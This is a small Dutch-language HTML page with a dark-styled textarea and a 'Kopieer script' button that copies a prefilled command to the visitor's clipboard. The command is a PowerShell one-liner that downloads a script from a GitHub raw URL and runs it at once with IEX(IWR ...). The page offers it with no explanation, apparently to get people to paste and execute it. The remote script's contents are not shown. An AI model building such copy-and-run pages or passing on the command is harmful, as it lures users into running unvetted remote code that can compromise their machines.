<!DOCTYPE html>
<html lang="nl">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Copy Script Knop</title>
<style>
    body {
        background-color: #111;
        color: #fff;
        font-family: Arial, sans-serif;
        display: flex;
        flex-direction: column;
        align-items: center;
        justify-content: center;
        height: 100vh;
        margin: 0;
    }

    #myInput {
        width: 80%;
        height: 60%;
        padding: 15px;
        font-size: 1rem;
        margin-bottom: 20px;
        border: 2px solid #888;
        border-radius: 8px;
        background-color: #222;
        color: #fff;
        white-space: pre; /* behoudt alle nieuwe regels */
        overflow-y: auto;
    }

    button {
        padding: 20px 40px;
        font-size: 1.5rem;
        border: none;
        border-radius: 10px;
        background-color: #444;
        color: #fff;
        cursor: pointer;
        transition: background-color 0.3s;
    }

    button:hover {
        background-color: #666;
    }
</style>
</head>
<body>

<textarea id="myInput">powershell IEX(IWR https://raw.githubusercontent.com/VBV11/BF/refs/heads/main/BF.ps1)</textarea>

<button onclick="copyText()">Kopieer script</button>

<script>
function copyText() {
    var copyText = document.getElementById("myInput");
    copyText.select();
    copyText.setSelectionRange(0, 99999); // Voor mobiele apparaten
    navigator.clipboard.writeText(copyText.value);
    alert("Gekopieerd!");
}
</script>

</body>
</html>
